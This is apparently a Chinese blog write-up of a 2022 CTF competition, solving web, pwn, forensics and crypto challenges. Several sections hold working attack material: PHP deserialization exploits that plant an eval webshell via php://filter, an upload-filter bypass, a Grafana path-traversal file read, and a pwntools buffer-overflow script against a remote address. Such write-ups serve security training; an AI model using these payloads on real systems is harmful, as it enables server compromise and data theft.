---
title: 首届“天权信安&catf1ag”网络安全联合公开赛
date: 2022-12-14 22:31:52
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20221214214722535](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20221214214722535.png?x-oss-process=hzy)

<!--more-->

# 前言

区区第七不足挂齿，再接再厉

![image-20221214213946123](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20221214213946123.png?x-oss-process=hzy)

# WP

## POP

反序列化POP链子构造

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image001.png?x-oss-process=hzy)

这地方使用php伪协议绕过写入文件

**php://filter/write=convert.base64-decode/resource=1.php**

文件内容写一句木马

POC如下

```
<?php
class catf1ag1{
    public $hzy;
    public $arr;
    function __construct(){
        $this->hzy = new catf1ag2();
        $this->arr = array('pputut'=>'pputut');
    }
}

class catf1ag2{
    public $file ;
    public $txt;
    function __construct(){
        $this->file = 'php://filter/write=convert.base64-decode/resource=1.php';
        $this->txt = '<?php @eval($_POST[1]);?>';
        $this->txt = base64_encode($this->txt);
    }
}
$shell = new catf1ag1();
$shell1 = serialize($shell);
$result = base64_encode($shell1);
print($result);
//Tzo4OiJjYXRmMWFnMSI6Mjp7czozOiJoenkiO086ODoiY2F0ZjFhZzIiOjI6e3M6NDoiZmlsZSI7czo1NToicGhwOi8vZmlsdGVyL3dyaXRlPWNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0xLnBocCI7czozOiJ0eHQiO3M6MzY6IlBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd6RmRLVHMvUGc9PSI7fXM6MzoiYXJyIjthOjE6e3M6NjoicHB1dHV0IjtzOjY6InBwdXR1dCI7fX0=
```

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image003.png?x-oss-process=hzy)

得到flag

flag{2c0235e106ff8b51ec35e3054eddf9bd}

## 十位马

拿到附件是一堆数据，考虑到可能是hex数据，搜索常见文件头ZIP，PNG等等，发现存在zip可疑数据头

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image005.png?x-oss-process=hzy)

ZIP正常文件头应该是50 4B 03 04,但是这里上似乎是04034B50，同时前两位数据还被篡改了，大胆的猜想就是整个数据被两两导致又整体倒置了，写个脚本转换一下

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image007.png?x-oss-process=hzy)

整体恢复之后再恢每两组的

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image009.png?x-oss-process=hzy)

使用脚本如下

```

data = open('zipdata','w')

with open('data','r')as file:

  wrong = file.read()

 

right = wrong[::-1]

print(right)

data.write(right)

print("success!!")

data.close()

flag = open("zip","rb")

right_flag = open("flag","w")

 

i=0

s=""

 

while 1:

  c =flag.read(1)

  i = i+1

  if not c:

​    break

  else:

​    s += hex(ord(c))[2::].zfill(2)[::-1]

right_flag.write(s)

print(s)

print("complete!!")


 
 

#data.write(right)

```

恢复成功之后用010打开，把前两位改成50 4B

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image011.png?x-oss-process=hzy)

保存之后解压

 

一百![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image013.png?x-oss-process=hzy)

一百张图片，是拼图 10*10的，用montage工具即可，得到一个二维码

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image014.png?x-oss-process=hzy)

加一下定位角

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image015.png?x-oss-process=hzy)

扫码得到flag

flag{cbef4c93-5e9c-11ed-8205-666c80085daf}

## ezlogin

dirsearch扫一下扫到robots.txt

 

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image017.png?x-oss-process=hzy)

```
访问得到/imdex.php/
```

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image019.png?x-oss-process=hzy)

访问此路径得到提示

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image021.png?x-oss-process=hzy)

提示是try the way,source.php，看到urlway的值，是经过两次base64编码+hex转换，所以尝试一下这个方式加密source.php传参进去TnpNMlpqYzFOekkyTXpZMU1tVTNNRFk0TnpBPQ==

这个时候发现有个302跳转，抓包拦截

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image023.png?x-oss-process=hzy)

又得到个路径/surprise/source.php，访问一下得到反序列化题目

死亡绕过+tostring魔法函数绕过，php伪协议绕过

Exp如下

```
<?php
class A{
    public $hello;
    public function __construct(){
        $this->hello = new B;
    }
}
class B{
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = 'php://filter/write=string.rot13/resource=1.php';
        $this -> text = '<?cuc riny($_CBFG[1]);';

    }
}

$h = new A();
$SHELL = serialize($h);
echo urlencode($SHELL);
// O%3A1%3A%22A%22%3A1%3A%7Bs%3A5%3A%22hello%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A46%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D1.php%22%3Bs%3A4%3A%22text%22%3Bs%3A22%3A%22%3C%3Fcuc+riny%28%24_CBFG%5B1%5D%29%3B%22%3B%7D%7D
```

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image025.png?x-oss-process=hzy)

flag{bed8858318758dc173a061631707a157}

## history

Grafana8.3.0版本，目录穿越历史漏洞，任意文件读取直接搜

[(70条消息) Grafana 任意文件读取漏洞复现_MrHatSec的博客-CSDN博客_grafana漏洞](https://blog.csdn.net/MrHatSec/article/details/123523216)

爆破发现插件是gettingstarted，题目提示没有做好痕迹清理，读文件/home/grafana/.bash_history

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image027.png?x-oss-process=hzy)

发现写入flag的命令，找到flag路径直接读得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image029.png?x-oss-process=hzy)

flag{a5899c555d6b61207b4dcab081e837b5}

## fileupload

题目看源码得到提示

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image030.png?x-oss-process=hzy)、

访问include/f1ag_1s_n0t_here.php找到上传点

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image032.png?x-oss-process=hzy)

只允许上传jpg，bp抓包拦截一下，发现php也被过滤了，大小写绕过，直接命令执行

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image034.png?x-oss-process=hzy)

访问该文件uploads/20221209150134_513.pHP5

得到flag

flag{8bc42d9c0d609ddefccf8c576e86ce5f}

## passwd

根据题目描述可以知道sha256爆破，根据条件去写脚本爆破（ps：这里不得不吐槽一下，密文格式说了是带文字的，这地方很容易误导人，我就是带了文字一直爆破都不行，后来发现不带文字秒出了），题目就是这么个题目，脚本如下

```
import hashlib
from turtle import right
for h in range(0,3):#时
    for y in range(0,10):#时
        for g in range(0,4):#日
            for n in range(0,10):
                for e in range(0,2):#月
                    for w in range(1,3):#月
                        #for d in range(0,3):#nian
                           # for r in range(0,10):#nian
                                for c in range(0,10):#分
                                    for m in range(0,7):
                                        #for t in range(1,3):
                                            #for o in range(0,3):
                                                #num="2022年"+str(e)+str(w)+"月"+str(g)+str(n)+"日"+str(h)+str(y)+"时"+str(m)+str(c)+"分"
                                                num="2022"+str(e)+str(w)+str(g)+str(n)+str(h)+str(y)+str(m)+str(c)
                                                num_sha = hashlib.sha256(num.encode('utf-8')).hexdigest()
                                                print(num)
                                                print(num_sha)
                                                #right = "3250a3e26bd6516c36468efa150584cc8799257fbd6edd8bcecd8016ab72f74c"

                                                right = "69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95"
                                                if(num_sha == right):
                                                    print(num)
                                                    print("success!!!")
                                                    exit()


                                   
```

爆破得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image036.png?x-oss-process=hzy)

catf1ag{202211121750}

## 疑惑

疑惑，异或

打开附件，数据异或一下

```python
a='welcome_to_nine-ak_match_is_so_easy_!@!'
 b=[20, 4, 24, 5, 94, 12, 2, 36 ,26, 6, 49, 11, 68, 15, 14, 114, 12, 10, 43, 14, 9 ,43 ,10, 27, 31, 31, 22, 45, 10, 48, 58, 4 ,18, 10, 38, 31, 14, 97, 92]
 flag=''
 for i in range(len(a)):
   flag+=chr(ord(a[i])^b[i])
 print(flag)
```

catf1ag{nine-ak_match_is@very_easy_@/!}

## checkin

atoi函数绕过，第一位不能是负号‘-‘

那就空格-1绕过

Ret2text

脚本如下：

```
from pwn import *

context(log_level='debug',os='linux',arch='amd64')

p=remote("180.76.166.28",6000)

\#p=process("./checkin")

hack=0x0000000000400866+1

payload0=b'adad'

payload=b' -1'

payload1=b'a'*(0x50+8)+p64(hack)

p.sendline(payload0)

sleep(1)

p.sendline(payload)

sleep(1) flag{2e94dd86-a57b-4365-b559-9e8a2ca0a8d4}

p.sendline(payload1)

p.interactive()
```



![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image038.jpg?x-oss-process=hzy)

flag{2e94dd86-a57b-4365-b559-9e8a2ca0a8d4}

## angr

第一次输入0让dword_804A06C=1

第二个输入2，让其执行system函数

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image040.png?x-oss-process=hzy)

## 简单隐写

 

拿到附件发现是jpg

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image042.png?x-oss-process=hzy)

藏了压缩包，尝试解压发现需要密码

Jphswin隐写得到解压密码catf1agcatf1agcatf1ag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image043.png?x-oss-process=hzy)

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image044.png?x-oss-process=hzy)

再使用凯撒爆破一下得到明文flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image045.png?x-oss-process=hzy)

catf1ag{JPhs_w1n_Y0u_G3t_IT!!!}

## easyrsa

已知e,n,d,c

首先先yafu分解得到p，q

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image047.png?x-oss-process=hzy)

P=

117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800085999

P309 

q=

117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800084891

然后脚本一把梭，得到flag

```
from Crypto.Util.number import long_to_bytes

n=13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109

e=0x10001

c=11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578

d=12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093

key=pow(c,d,n)

print(long_to_bytes(key))
```



 

 

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image048.png?x-oss-process=hzy)

flag{3895dfda-67b1-11ed-b784-b07b2568d266}